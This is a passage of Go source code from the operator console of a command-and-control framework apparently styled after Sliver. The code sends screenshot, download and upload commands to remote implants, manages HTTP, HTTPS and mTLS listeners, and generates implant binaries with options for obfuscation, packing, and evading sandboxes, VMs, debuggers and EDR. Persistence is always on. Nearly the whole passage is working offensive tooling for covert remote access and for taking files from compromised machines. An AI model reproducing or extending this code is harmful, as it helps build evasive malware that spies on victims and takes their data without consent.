	return fmt.Sprintf("%.1f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])
}

// handleScreenshotCommand handles screenshot capture with automatic download
func (oc *OperatorConsole) handleScreenshotCommand(implantID string) {
	cmd := &pb.CommandMessage{
		CommandId: generateCommandID(),
		Type:      pb.CommandMessage_SCREENSHOT_CAPTURE,
		Command:   "screenshot",
		Args:      []string{},
		Timeout:   30,
	}

	if oc.client == nil {
		fmt.Printf("%s No server connection available\n", colorize("[*]", colorBlue))
		return
	}

	req := &pb.SendCommandRequest{
		ImplantId: implantID,
		Command:   cmd,
	}

	fmt.Printf("%s Capturing screenshot...", colorize("[*]", colorBlue))

	resp, err := oc.client.SendCommand(context.Background(), req)
	if err != nil {
		fmt.Printf("\r%s Failed to send screenshot command: %v\n", colorize("[!]", colorRed), err)
		return
	}

	if !resp.Success {
		fmt.Printf("\r%s Screenshot command failed: %s\n", colorize("[!]", colorRed), resp.Message)
		return
	}

	// Wait for the command result
	resultReq := &pb.CommandResultRequest{
		CommandId:      resp.CommandId,
		TimeoutSeconds: 30,
	}

	resultResp, err := oc.client.GetCommandResult(context.Background(), resultReq)

	if err != nil {
		fmt.Printf("\r%s Failed to get screenshot result: %v\n", colorize("[!]", colorRed), err)
		return
	}

	if !resultResp.Ready {
		fmt.Printf("\r%s Screenshot timed out or still pending\n", colorize("[!]", colorRed))
		return
	}

	if !resultResp.Success {
		fmt.Printf("\r%s Screenshot failed: %s\n", colorize("[!]", colorRed), resultResp.Error)
		return
	}

	// Parse the JSON response to extract file path and metadata
	var screenshotData struct {
		Status         string `json:"status"`
		FilePath       string `json:"file_path"`
		ImageSizeBytes int64  `json:"image_size_bytes"`
		Dimensions     struct {
			Width  int `json:"width"`
			Height int `json:"height"`
		} `json:"dimensions"`
	}

	if err := json.Unmarshal([]byte(resultResp.Output), &screenshotData); err != nil {
		fmt.Printf("\r%s Failed to parse screenshot response: %v\n", colorize("[!]", colorRed), err)
		return
	}

	if screenshotData.FilePath == "" {
		fmt.Printf("\r%s No file path in screenshot response\n", colorize("[!]", colorRed))
		return
	}

	// Generate local filename with timestamp
	timestamp := time.Now().Format("20060102_150405")
	localPath := fmt.Sprintf("screenshot_%s_%s.png", implantID[:8], timestamp)

	// Clear the "Capturing..." line and show success
	fmt.Printf("\r%s Screenshot captured: %dx%d (%s)\n",
		colorize("[+]", colorGreen),
		screenshotData.Dimensions.Width,
		screenshotData.Dimensions.Height,
		formatSize(screenshotData.ImageSizeBytes))

	// Automatically download the screenshot
	oc.handleDownloadCommandQuiet(implantID, screenshotData.FilePath, localPath)
}

// handleDownloadCommandQuiet downloads a file without verbose output (for screenshot auto-download)
func (oc *OperatorConsole) handleDownloadCommandQuiet(implantID, remoteFile, localPath string) {
	cmd := &pb.CommandMessage{
		CommandId: generateCommandID(),
		Type:      pb.CommandMessage_DOWNLOAD,
		Command:   "download",
		Args:      []string{remoteFile, localPath},
		Timeout:   30,
	}

	if oc.client != nil {
		req := &pb.SendCommandRequest{
			ImplantId: implantID,
			Command:   cmd,
		}

		resp, err := oc.client.SendCommand(context.Background(), req)
		if err != nil {
			fmt.Printf("%s Failed to download screenshot: %v\n", colorize("[!]", colorRed), err)
			return
		}

		if !resp.Success {
			fmt.Printf("%s Download failed: %s\n", colorize("[!]", colorRed), resp.Message)
			return
		}

		// Wait for the command result
		resultReq := &pb.CommandResultRequest{
			CommandId:      resp.CommandId,
			TimeoutSeconds: 30,
		}

		resultResp, err := oc.client.GetCommandResult(context.Background(), resultReq)
		if err != nil {
			fmt.Printf("%s Failed to get download result: %v\n", colorize("[!]", colorRed), err)
			return
		}

		if !resultResp.Success {
			fmt.Printf("%s Download failed: %s\n", colorize("[!]", colorRed), resultResp.Error)
			return
		}

		// Process download result quietly
		if strings.HasPrefix(resultResp.Output, "DOWNLOAD_SUCCESS|") {
			oc.processDownloadResultQuiet(resultResp.Output, localPath)
		} else {
			fmt.Printf("%s Screenshot saved to %s\n", colorize("[+]", colorGreen), localPath)
		}
	}
}

// processDownloadResultQuiet processes download silently with minimal output
func (oc *OperatorConsole) processDownloadResultQuiet(result, localPath string) {
	// Parse the result: DOWNLOAD_SUCCESS|localPath|size|base64Content
	parts := strings.SplitN(result, "|", 4)
	if len(parts) != 4 {
		fmt.Printf("%s Invalid download result format\n", colorize("[!]", colorRed))
		return
	}

	sizeStr := parts[2]
	encodedContent := parts[3]

	// Decode the base64 content
	content, err := base64.StdEncoding.DecodeString(encodedContent)
	if err != nil {
		fmt.Printf("%s Failed to decode file content: %v\n", colorize("[!]", colorRed), err)
		return
	}

	// Ensure directory exists
	dir := filepath.Dir(localPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		fmt.Printf("%s Failed to create directory %s: %v\n", colorize("[!]", colorRed), dir, err)
		return
	}

	// Write the file
	if err := ioutil.WriteFile(localPath, content, 0644); err != nil {
		fmt.Printf("%s Failed to write file %s: %v\n", colorize("[!]", colorRed), localPath, err)
		return
	}

	// Get absolute path for display
	absPath, _ := filepath.Abs(localPath)

	// Parse size as int64 for formatting
	size, _ := strconv.ParseInt(sizeStr, 10, 64)

	fmt.Printf("%s Screenshot saved to %s (%s)\n",
		colorize("[+]", colorGreen), absPath, formatSize(size))
}

// handleUploadCommand handles upload commands with file content reading
func (oc *OperatorConsole) handleUploadCommand(implantID, localFile, remotePath string) {
	// Check if local file exists
	if _, err := os.Stat(localFile); os.IsNotExist(err) {
		fmt.Printf("%s Local file does not exist: %s\n", colorize("[*]", colorBlue), localFile)
		return
	}

	// Read local file content
	content, err := ioutil.ReadFile(localFile)
	if err != nil {
		fmt.Printf("%s Failed to read local file %s: %v\n", colorize("[*]", colorBlue), localFile, err)
		return
	}

	fmt.Printf("%s Uploading %s to %s (%d bytes)...\n",
		colorize("[*]", colorBlue), localFile, remotePath, len(content))

	// Encode content in base64 for safe transport
	encoded := base64.StdEncoding.EncodeToString(content)

	cmd := &pb.CommandMessage{
		CommandId: generateCommandID(),
		Type:      pb.CommandMessage_UPLOAD,
		Command:   "upload",
		Args:      []string{localFile, remotePath},
		Data:      []byte(encoded), // Send base64 encoded content in Data field
		Timeout:   30,
	}

	err = oc.SendCommand(implantID, cmd)
	if err != nil {
		fmt.Printf("%s Failed to send upload command: %v\n", colorize("[*]", colorBlue), err)
		return
	}
}

// formatBytes converts bytes to human readable format
func formatBytes(bytes int) string {
	const unit = 1024
	if bytes < unit {
		return fmt.Sprintf("%d B", bytes)
	}
	div, exp := int64(unit), 0
	for n := bytes / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])
}

// handleListenerCommand handles listener management commands
func (oc *OperatorConsole) handleListenerCommand(args []string) {
	if oc.client == nil {
		fmt.Printf("%s Not connected to server\n", colorize("[*]", colorBlue))
		return
	}
	if len(args) == 0 {
		fmt.Printf("%s Usage: listener <add|ls|rm> [args]\n", colorize("[*]", colorBlue))
		return
	}
	sub := args[0]
	switch sub {
	case "add":
		if len(args) < 2 {
			fmt.Printf("%s Usage: listener add <host:port> [http|https|mtls] [--cert f --key f --ca f]\n", colorize("[*]", colorBlue))
			return
		}
		addr := args[1]
		ltype := pb.ListenerType_LISTENER_HTTPS
		certFile := ""
		keyFile := ""
		caFile := ""
		// Optional protocol arg
		if len(args) >= 3 && !strings.HasPrefix(args[2], "--") {
			switch strings.ToLower(args[2]) {
			case "http":
				ltype = pb.ListenerType_LISTENER_HTTP
			case "https":
				ltype = pb.ListenerType_LISTENER_HTTPS
			case "mtls":
				ltype = pb.ListenerType_LISTENER_MTLS
			default:
				fmt.Printf("%s Unknown listener type: %s (use http|https|mtls)\n", colorize("[*]", colorBlue), args[2])
				return
			}
		}
		// Parse flags
		for i := 2; i < len(args); i++ {
			if args[i] == "--cert" && i+1 < len(args) {
				certFile = args[i+1]
				i++
			} else if args[i] == "--key" && i+1 < len(args) {
				keyFile = args[i+1]
				i++
			} else if args[i] == "--ca" && i+1 < len(args) {
				caFile = args[i+1]
				i++
			}
		}
		req := &pb.ListenerAddRequest{Address: addr, Type: ltype, CertFile: certFile, KeyFile: keyFile, CaFile: caFile}
		resp, err := oc.client.AddListener(context.Background(), req)
		if err != nil || !resp.Success {
			if err != nil {
				fmt.Printf("%s %v\n", colorize("[*]", colorBlue), err)
			} else {
				fmt.Printf("%s %s\n", colorize("[*]", colorBlue), resp.Message)
			}
			return
		}
		fmt.Printf("%s Listener %s started on %s (%s)\n", colorize("[*]", colorBlue), resp.Listener.Id, resp.Listener.Address, strings.TrimPrefix(strings.ToLower(resp.Listener.Type.String()), "listener_"))
	case "ls", "list":
		resp, err := oc.client.ListListeners(context.Background(), &pb.ListenerListRequest{})
		if err != nil {
			fmt.Printf("%s %v\n", colorize("[*]", colorBlue), err)
			return
		}
		if len(resp.Listeners) == 0 {
			fmt.Println("(no listeners)")
			return
		}
		for _, l := range resp.Listeners {
			fmt.Printf("- %s  %s  [%s]  (since %s)\n", colorize(l.Id, colorYellow), colorize(l.Address, colorBlue), strings.TrimPrefix(strings.ToLower(l.Type.String()), "listener_"), colorize(time.Unix(l.StartedAt, 0).Format(time.RFC3339), colorMagenta))
		}
	case "rm", "del", "remove":
		if len(args) < 2 {
			fmt.Printf("%s Usage: listener rm <id>\n", colorize("[*]", colorBlue))
			return
		}
		resp, err := oc.client.RemoveListener(context.Background(), &pb.ListenerRemoveRequest{Id: args[1]})
		if err != nil || !resp.Success {
			if err != nil {
				fmt.Printf("%s %v\n", colorize("[*]", colorBlue), err)
			} else {
				fmt.Printf("%s %s\n", colorize("[*]", colorBlue), resp.Message)
			}
			return
		}
		fmt.Printf("%s Listener stopped\n", colorize("[*]", colorBlue))
	default:
		fmt.Printf("%s Usage: listener <add|ls|rm> [args]\n", colorize("[*]", colorBlue))
	}
}

// handleGenerateCommand handles implant generation commands in Sliver C2 style
func (oc *OperatorConsole) handleGenerateCommand(args []string) {
	if oc.client == nil {
		fmt.Printf("%s Not connected to server\n", colorize("[*]", colorBlue))
		return
	}

	// Parse Sliver-style generate command
	config := &GenerateConfig{
		OS:          runtime.GOOS,
		Arch:        runtime.GOARCH,
		Format:      "exe",
		Debug:       false,
		Evasion:     false,
		SkipSymbols: false,
		Timeout:     60,
		OutputDir:   "./",
	}

	if len(args) == 0 {
		oc.showGenerateHelp()
		return
	}

	// Parse arguments Sliver-style
	i := 0
	for i < len(args) {
		switch args[i] {
		case "--mtls":
			if i+1 >= len(args) {
				fmt.Printf("%s --mtls requires an address\n", colorize("[*]", colorBlue))
				return
			}
			i++
			config.ListenerAddr = args[i]
			config.Transport = "mtls"
		case "--http":
			if i+1 >= len(args) {
				fmt.Printf("%s --http requires an address\n", colorize("[*]", colorBlue))
				return
			}
			i++
			config.ListenerAddr = args[i]
			config.Transport = "http"
		case "--https":
			if i+1 >= len(args) {
				fmt.Printf("%s --https requires an address\n", colorize("[*]", colorBlue))
				return
			}
			i++
			config.ListenerAddr = args[i]
			config.Transport = "https"
		case "--dns":
			if i+1 >= len(args) {
				fmt.Printf("%s --dns requires a domain\n", colorize("[*]", colorBlue))
				return
			}
			i++
			config.ListenerAddr = args[i]
			config.Transport = "dns"
		case "--os", "-o":
			if i+1 >= len(args) {
				fmt.Printf("%s --os requires a target OS\n", colorize("[*]", colorBlue))
				return
			}
			i++
			config.OS = args[i]
		case "--arch", "-a":
			if i+1 >= len(args) {
				fmt.Printf("%s --arch requires a target architecture\n", colorize("[*]", colorBlue))
				return
			}
			i++
			config.Arch = args[i]
		case "--format", "-f":
			if i+1 >= len(args) {
				fmt.Printf("%s --format requires a format type\n", colorize("[*]", colorBlue))
				return
			}
			i++
			config.Format = args[i]
		case "--save", "-s":
			if i+1 >= len(args) {
				fmt.Printf("%s --save requires a directory path\n", colorize("[*]", colorBlue))
				return
			}
			i++
			config.OutputDir = args[i]
		case "--debug", "-d":
			config.Debug = true
		case "--evasion", "-e":
			config.Evasion = true
		case "--skip-symbols":
			config.SkipSymbols = true
		case "--garble", "-g":
			config.Garble = true
		case "--timeout", "-t":
			if i+1 >= len(args) {
				fmt.Printf("%s --timeout requires a value in seconds\n", colorize("[*]", colorBlue))
				return
			}
			i++
			if timeout, err := strconv.Atoi(args[i]); err != nil {
				fmt.Printf("%s Invalid timeout value: %s\n", colorize("[*]", colorBlue), args[i])
				return
			} else {
				config.Timeout = int32(timeout)
			}

		// Enhanced Obfuscation Options
		case "--obf-level":
			if i+1 >= len(args) {
				fmt.Printf("%s --obf-level requires a value (0-4)\n", colorize("[*]", colorBlue))
				return
			}
			i++
			if level, err := strconv.Atoi(args[i]); err != nil || level < 0 || level > 4 {
				fmt.Printf("%s Invalid obfuscation level: %s (must be 0-4)\n", colorize("[*]", colorBlue), args[i])
				return
			} else {
				config.ObfuscationLevel = level
			}
		case "--string-obf":
			config.StringObfuscation = true
		case "--name-obf":
			config.NameObfuscation = true
		case "--control-flow-obf":
			config.ControlFlowObfuscation = true
		case "--api-obf":
			config.APIObfuscation = true
		case "--network-obf":
			config.NetworkObfuscation = true
		case "--runtime-packing":
			config.RuntimePacking = true
		case "--upx-packing":
			config.UPXPacking = true
		case "--fake-resources":
			config.FakeResources = true

		// Advanced Evasion Options
		case "--process-hollowing":
			config.ProcessHollowing = true
		case "--anti-emulation":
			config.AntiEmulation = true
		case "--sandbox-evasion":
			config.SandboxEvasion = true
		case "--edr-detection":
			config.EDRDetection = true
		case "--network-fingerprinting":
			config.NetworkFingerprinting = true

		// Basic Evasion Options
		case "--anti-vm":
			config.AntiVM = true
		case "--anti-debug":
			config.AntiDebug = true
		case "--sleep-mask":
			config.SleepMask = true
		// Quick preset options
		case "--preset-light":
			config.ObfuscationLevel = 1
		case "--preset-medium":
			config.ObfuscationLevel = 2
		case "--preset-heavy":
			config.ObfuscationLevel = 3
		case "--preset-extreme":
			config.ObfuscationLevel = 4
		default:
			fmt.Printf("%s Unknown option: %s\n", colorize("[*]", colorBlue), args[i])
			oc.showGenerateHelp()
			return
		}
		i++
	}

	// Validate required parameters
	if config.ListenerAddr == "" {
		fmt.Printf("%s Must specify a listener address (--mtls, --http, --https, or --dns)\n", colorize("[*]", colorBlue))
		oc.showGenerateHelp()
		return
	}

	oc.executeGeneration(config)
}

// showGenerateHelp displays Sliver-style generate command usage
func (oc *OperatorConsole) showGenerateHelp() {
	fmt.Printf("%s %s\n", colorize("[*]", colorBlue), colorize("Generate Implant Usage:", colorCyan))
	fmt.Println("")
	fmt.Printf("%s %s\n", colorize("generate", colorGreen), "[transport] [options]")
	fmt.Println("")
	fmt.Printf("%s\n", colorize("Transport Options:", colorCyan))
	fmt.Printf("  %s %s    %s\n", colorize("--mtls", colorYellow), colorize("<address>", colorMagenta), "mTLS transport (default)")
	fmt.Printf("  %s %s    %s\n", colorize("--http", colorYellow), colorize("<address>", colorMagenta), "HTTP transport")
	fmt.Printf("  %s %s   %s\n", colorize("--https", colorYellow), colorize("<address>", colorMagenta), "HTTPS transport")
	fmt.Printf("  %s %s      %s\n", colorize("--dns", colorYellow), colorize("<domain>", colorMagenta), "DNS transport")
	fmt.Println("")
	fmt.Printf("%s\n", colorize("Build Options:", colorCyan))
	fmt.Printf("  %s %s       %s\n", colorize("--os, -o", colorYellow), colorize("<os>", colorMagenta), "Target OS (windows, linux, darwin)")
	fmt.Printf("  %s %s   %s\n", colorize("--arch, -a", colorYellow), colorize("<arch>", colorMagenta), "Target architecture (amd64, 386, arm64)")
	fmt.Printf("  %s %s  %s\n", colorize("--format, -f", colorYellow), colorize("<fmt>", colorMagenta), "Output format (exe, dll, shellcode, service, source)")
	fmt.Printf("  %s %s    %s\n", colorize("--save, -s", colorYellow), colorize("<dir>", colorMagenta), "Save to directory (default: ./)")
	fmt.Printf("  %s %s %s\n", colorize("--timeout, -t", colorYellow), colorize("<sec>", colorMagenta), "Connection timeout in seconds")
	fmt.Println("")
	fmt.Printf("%s\n", colorize("Advanced Options:", colorCyan))
	fmt.Printf("  %s         %s\n", colorize("--debug, -d", colorYellow), "Enable debug mode")
	fmt.Printf("  %s       %s\n", colorize("--evasion, -e", colorYellow), "Enable basic evasion techniques")
	fmt.Printf("  %s      %s\n", colorize("--skip-symbols", colorYellow), "Skip symbol obfuscation")
	fmt.Printf("  %s        %s\n", colorize("--garble, -g", colorYellow), "Use garble for code obfuscation")
	fmt.Println("")
	fmt.Printf("%s\n", colorize("Enhanced Obfuscation:", colorCyan))
	fmt.Printf("  %s %s    %s\n", colorize("--obf-level", colorYellow), colorize("<0-4>", colorMagenta), "Obfuscation level (0=none, 1=light, 2=medium, 3=heavy, 4=extreme)")
	fmt.Printf("  %s      %s\n", colorize("--string-obf", colorYellow), "XOR-based string encryption")
	fmt.Printf("  %s        %s\n", colorize("--name-obf", colorYellow), "Function/variable name obfuscation")
	fmt.Printf("  %s  %s\n", colorize("--control-flow-obf", colorYellow), "Junk code and control flow flattening")
	fmt.Printf("  %s         %s\n", colorize("--api-obf", colorYellow), "Dynamic API resolution")
	fmt.Printf("  %s     %s\n", colorize("--network-obf", colorYellow), "Network traffic obfuscation")
	fmt.Printf("  %s   %s\n", colorize("--runtime-packing", colorYellow), "Runtime code encryption")
	fmt.Printf("  %s      %s\n", colorize("--upx-packing", colorYellow), "UPX compression")
	fmt.Printf("  %s    %s\n", colorize("--fake-resources", colorYellow), "Fake version info and resources")
	fmt.Println("")
	fmt.Printf("%s\n", colorize("Advanced Evasion:", colorCyan))
	fmt.Printf("  %s %s\n", colorize("--process-hollowing", colorYellow), "Process hollowing detection")
	fmt.Printf("  %s    %s\n", colorize("--anti-emulation", colorYellow), "Anti-emulation techniques")
	fmt.Printf("  %s    %s\n", colorize("--sandbox-evasion", colorYellow), "Enhanced sandbox detection")
	fmt.Printf("  %s      %s\n", colorize("--edr-detection", colorYellow), "EDR/AV process detection")
	fmt.Printf("  %s %s\n", colorize("--network-fingerprinting", colorYellow), "Network-based detection evasion")
	fmt.Printf("  %s          %s\n", colorize("--anti-vm", colorYellow), "Anti-VM detection")
	fmt.Printf("  %s       %s\n", colorize("--anti-debug", colorYellow), "Anti-debugging techniques")
	fmt.Printf("  %s       %s\n", colorize("--sleep-mask", colorYellow), "Sleep masking for evasion")
	fmt.Printf("\n%s\n", colorize("Note: Persistent mode is always enabled (implants never exit due to evasion checks)", colorCyan))
	fmt.Println("")
	fmt.Printf("%s\n", colorize("Quick Presets:", colorCyan))
	fmt.Printf("  %s     %s\n", colorize("--preset-light", colorYellow), "Light obfuscation (level 1)")
	fmt.Printf("  %s    %s\n", colorize("--preset-medium", colorYellow), "Medium obfuscation (level 2)")
	fmt.Printf("  %s     %s\n", colorize("--preset-heavy", colorYellow), "Heavy obfuscation (level 3)")
	fmt.Printf("  %s   %s\n", colorize("--preset-extreme", colorYellow), "Extreme obfuscation (level 4)")
	fmt.Println("")
	fmt.Printf("%s\n", colorize("Examples:", colorCyan))
	fmt.Printf("  %s %s %s\n", colorize("generate", colorGreen), colorize("--mtls", colorYellow), colorize("192.168.1.100:8443", colorMagenta))
	fmt.Printf("  %s %s %s %s %s %s %s\n", colorize("generate", colorGreen), colorize("--https", colorYellow), colorize("example.com:443", colorMagenta), colorize("--os", colorYellow), colorize("windows", colorMagenta), colorize("--arch", colorYellow), colorize("amd64", colorMagenta))
	fmt.Printf("  %s %s %s %s %s %s\n", colorize("generate", colorGreen), colorize("--http", colorYellow), colorize("10.0.0.1:80", colorMagenta), colorize("--format", colorYellow), colorize("dll", colorMagenta), colorize("--evasion --garble", colorYellow))
	fmt.Printf("  %s %s %s %s %s\n", colorize("generate", colorGreen), colorize("--mtls", colorYellow), colorize("10.0.0.1:8443", colorMagenta), colorize("--obf-level", colorYellow), colorize("3", colorMagenta))
	fmt.Printf("  %s %s %s %s\n", colorize("generate", colorGreen), colorize("--https", colorYellow), colorize("cdn.example.com:443", colorMagenta), colorize("--preset-heavy", colorYellow))
	fmt.Printf("  %s %s %s %s\n", colorize("generate", colorGreen), colorize("--mtls", colorYellow), colorize("10.0.0.1:8443", colorMagenta), colorize("--string-obf --api-obf --sandbox-evasion", colorYellow))
}

// executeGeneration executes the implant generation with the provided config
func (oc *OperatorConsole) executeGeneration(config *GenerateConfig) {
	// Start timer
	startTime := time.Now()

	// Find or create a listener for this transport and address
	listenerID, err := oc.findOrCreateListener(config)
	if err != nil {
		fmt.Printf("%s Failed to setup listener: %v\n", colorize("[*]", colorBlue), err)
		return
	}

	// Create generation request
	req := &pb.ImplantGenerationRequest{
		ListenerId: listenerID,
		Format:     config.Format,
		Os:         config.OS,
		Arch:       config.Arch,
		Options:    make(map[string]string),
	}

	// Add advanced options
	if config.Debug {
		req.Options["debug"] = "true"
	}
	if config.Evasion {
		req.Options["evasion"] = "true"
	}
	if config.SkipSymbols {
		req.Options["skip_symbols"] = "true"
	}
	if config.Garble {
		req.Options["garble"] = "true"
	}
	if config.Timeout > 0 {
		req.Options["timeout"] = fmt.Sprintf("%d", config.Timeout)
	}

	// Enhanced Obfuscation Options
	if config.ObfuscationLevel > 0 {
		req.Options["obfuscation_level"] = fmt.Sprintf("%d", config.ObfuscationLevel)
	}
	if config.StringObfuscation {
		req.Options["string_obfuscation"] = "true"
	}
	if config.NameObfuscation {
		req.Options["name_obfuscation"] = "true"
	}
	if config.ControlFlowObfuscation {
		req.Options["control_flow_obfuscation"] = "true"
	}
	if config.APIObfuscation {
		req.Options["api_obfuscation"] = "true"
	}
	if config.NetworkObfuscation {
		req.Options["network_obfuscation"] = "true"
	}
	if config.RuntimePacking {
		req.Options["runtime_packing"] = "true"
	}
	if config.UPXPacking {
		req.Options["upx_packing"] = "true"
	}
	if config.FakeResources {
		req.Options["fake_resources"] = "true"
	}

	// Advanced Evasion Options
	if config.ProcessHollowing {
		req.Options["process_hollowing"] = "true"
	}
	if config.AntiEmulation {
		req.Options["anti_emulation"] = "true"
	}
	if config.SandboxEvasion {
		req.Options["sandbox_evasion"] = "true"
	}
	if config.EDRDetection {
		req.Options["edr_detection"] = "true"
	}
	if config.NetworkFingerprinting {
		req.Options["network_fingerprinting"] = "true"
	}

	// Basic Evasion Options
	if config.AntiVM {
		req.Options["anti_vm"] = "true"
	}
	if config.AntiDebug {
		req.Options["anti_debug"] = "true"
	}
	if config.SleepMask {
		req.Options["sleep_mask"] = "true"
	}
	// Persistent mode is always enabled by default
	req.Options["persistent_mode"] = "true"

	// Output format matching Sliver style
	fmt.Printf("%s Generating new %s/%s implant binary\n", colorize("[*]", colorBlue), config.OS, config.Arch)

	// Show obfuscation status
	if config.ObfuscationLevel > 0 {
		levels := []string{"none", "light", "medium", "heavy", "extreme"}
		fmt.Printf("%s Enhanced obfuscation level: %s\n", colorize("[*]", colorBlue),
			colorize(levels[config.ObfuscationLevel], colorCyan))
	}

	var obfTechs []string
	if config.Garble {
		obfTechs = append(obfTechs, "garble")
	}
	if config.StringObfuscation {
		obfTechs = append(obfTechs, "string-encryption")
	}
	if config.NameObfuscation {
		obfTechs = append(obfTechs, "name-obfuscation")
	}
	if config.ControlFlowObfuscation {
		obfTechs = append(obfTechs, "control-flow")
	}
	if config.APIObfuscation {
		obfTechs = append(obfTechs, "api-hiding")
	}
	if config.NetworkObfuscation {
		obfTechs = append(obfTechs, "network-obfuscation")
	}
	if config.RuntimePacking {
		obfTechs = append(obfTechs, "runtime-packing")
	}
	if config.UPXPacking {
		obfTechs = append(obfTechs, "upx-compression")
	}

	if len(obfTechs) > 0 {
		fmt.Printf("%s Obfuscation techniques: %s\n", colorize("[*]", colorBlue),
			colorize(strings.Join(obfTechs, ", "), colorGreen))
	}

	var evasionTechs []string
	if config.ProcessHollowing {
		evasionTechs = append(evasionTechs, "process-hollowing")
	}
	if config.AntiEmulation {
		evasionTechs = append(evasionTechs, "anti-emulation")
	}
	if config.SandboxEvasion {
		evasionTechs = append(evasionTechs, "sandbox-evasion")
	}
	if config.EDRDetection {
		evasionTechs = append(evasionTechs, "edr-detection")
	}
	if config.NetworkFingerprinting {
		evasionTechs = append(evasionTechs, "network-fingerprinting")
	}
	if config.AntiVM {
		evasionTechs = append(evasionTechs, "anti-vm")
	}
	if config.AntiDebug {
		evasionTechs = append(evasionTechs, "anti-debug")
	}
	if config.SleepMask {
		evasionTechs = append(evasionTechs, "sleep-masking")
	}

	if len(evasionTechs) > 0 {
		fmt.Printf("%s Evasion techniques: %s\n", colorize("[*]", colorBlue),
			colorize(strings.Join(evasionTechs, ", "), colorYellow))
	}

	// Call server's GenerateImplant RPC
	resp, err := oc.client.GenerateImplant(context.Background(), req)
	if err != nil {
		fmt.Printf("%s Generation failed: %v\n", colorize("[*]", colorBlue), err)
		return
	}

	if !resp.Success {
		fmt.Printf("%s Generation failed: %s\n", colorize("[*]", colorBlue), resp.Message)
		return
	}

	// Generate filename if not provided
	filename := resp.Filename
	if filename == "" {
		filename = fmt.Sprintf("implant_%s_%s_%s", config.Transport, config.OS, config.Arch)
		if config.Format == "exe" || (config.Format == "" && config.OS == "windows") {
			filename += ".exe"
		} else if config.Format == "dll" {
			filename += ".dll"
		} else if config.Format == "source" {
			filename += ".go"
		}
	}

	// Ensure output directory exists
	if err := os.MkdirAll(config.OutputDir, 0755); err != nil {
		fmt.Printf("%s Failed to create output directory: %v\n", colorize("[*]", colorBlue), err)
		return
	}

	outputPath := filepath.Join(config.OutputDir, filename)

	// Set appropriate permissions
	fileMode := os.FileMode(0644)
	if config.Format == "exe" || config.Format == "" {
		fileMode = 0755 // Make executable
	}

	if err := os.WriteFile(outputPath, resp.Payload, fileMode); err != nil {
		fmt.Printf("%s Failed to save implant: %v\n", colorize("[*]", colorBlue), err)
		return
	}

	// Calculate build time
	buildTime := time.Since(startTime)

	// Final output
	fmt.Printf("%s Build completed in %s\n", colorize("[*]", colorBlue), buildTime.Round(time.Second))
	fmt.Printf("%s Implant saved to %s\n\n", colorize("[*]", colorBlue), outputPath)
}

// findOrCreateListener finds an existing listener or creates a new one for the given config
func (oc *OperatorConsole) findOrCreateListener(config *GenerateConfig) (string, error) {
	// First, list existing listeners to see if we already have one
	listResp, err := oc.client.ListListeners(context.Background(), &pb.ListenerListRequest{})
	if err != nil {
		return "", fmt.Errorf("failed to list listeners: %v", err)
	}

	// Convert transport to listener type
	var targetType pb.ListenerType
	switch strings.ToLower(config.Transport) {
	case "mtls":
		targetType = pb.ListenerType_LISTENER_MTLS
	case "https":
		targetType = pb.ListenerType_LISTENER_HTTPS
	case "http":
		targetType = pb.ListenerType_LISTENER_HTTP
	default:
		targetType = pb.ListenerType_LISTENER_MTLS // Default to mTLS
	}

	// Look for an existing listener with the same address and type
	for _, listener := range listResp.Listeners {
		if listener.Address == config.ListenerAddr && listener.Type == targetType {
			fmt.Printf("%s Using existing listener: %s\n", colorize("[*]", colorBlue), colorize(listener.Id, colorYellow))
			return listener.Id, nil
		}
	}

	// No existing listener found, create a new one
	fmt.Printf("%s Creating new %s listener on %s...\n", colorize("[*]", colorBlue), strings.ToUpper(config.Transport), config.ListenerAddr)

	addReq := &pb.ListenerAddRequest{
		Address: config.ListenerAddr,
		Type:    targetType,
	}

	addResp, err := oc.client.AddListener(context.Background(), addReq)
	if err != nil {
		return "", fmt.Errorf("failed to create listener: %v", err)
	}

	if !addResp.Success {
		return "", fmt.Errorf("failed to create listener: %s", addResp.Message)
	}

	fmt.Printf("%s Listener created: %s\n", colorize("[*]", colorBlue), colorize(addResp.Listener.Id, colorGreen))
	return addResp.Listener.Id, nil
}

// handleRegenerateCommand regenerates a previously built implant by codename
func (oc *OperatorConsole) handleRegenerateCommand(codename, saveDir string) {
	if oc.client == nil {
		fmt.Printf("%s Not connected to server\n", colorize("[*]", colorBlue))
		return
	}

	// Get all implant builds
	builds, err := oc.GetImplantBuilds()
	if err != nil {
		fmt.Printf("%s Failed to retrieve implant builds: %v\n", colorize("[!]", colorRed), err)
		return
	}

	// Find build by codename
	var targetBuild *pb.ImplantBuildInfo
	for _, build := range builds {
		if strings.EqualFold(build.Codename, codename) {
			targetBuild = build
			break
		}
	}

	if targetBuild == nil {
		fmt.Printf("%s Implant with codename %s not found\n", colorize("[!]", colorRed), colorize(codename, colorYellow))
		fmt.Printf("%s Use %s to see available implants\n", colorize("[*]", colorBlue), colorize("implants", colorGreen))
		return
	}

	fmt.Printf("%s Found implant: %s (%s/%s, %s)\n",
		colorize("[*]", colorBlue),
		colorize(targetBuild.Codename, colorGreen),
		targetBuild.Os,
		targetBuild.Arch,
		targetBuild.Format)

	// Create generation request with same configuration
	req := &pb.ImplantGenerationRequest{
		ListenerId: targetBuild.ListenerId,
		Format:     targetBuild.Format,
		Os:         targetBuild.Os,
		Arch:       targetBuild.Arch,
		Options:    make(map[string]string),
	}

	// Add obfuscation options
	if targetBuild.ObfuscationLevel > 0 {
		req.Options["obfuscation_level"] = fmt.Sprintf("%d", targetBuild.ObfuscationLevel)
	}

	// Add obfuscation techniques
	for _, tech := range targetBuild.ObfuscationTechs {
		switch tech {
		case "basic_obfuscation":
			req.Options["obfuscate"] = "true"
		case "garble":
			req.Options["garble"] = "true"
		case "string_obfuscation":
			req.Options["string_obfuscation"] = "true"
		case "name_obfuscation":
			req.Options["name_obfuscation"] = "true"
		case "control_flow_obfuscation":
			req.Options["control_flow_obfuscation"] = "true"
		case "api_obfuscation":
			req.Options["api_obfuscation"] = "true"
		case "network_obfuscation":
			req.Options["network_obfuscation"] = "true"
		case "runtime_packing":
			req.Options["runtime_packing"] = "true"
		case "upx_packing":
			req.Options["upx_packing"] = "true"
		case "fake_resources":
			req.Options["fake_resources"] = "true"
		case "process_hollowing":
			req.Options["process_hollowing"] = "true"
		case "anti_emulation":
			req.Options["anti_emulation"] = "true"
		case "sandbox_evasion":
			req.Options["sandbox_evasion"] = "true"
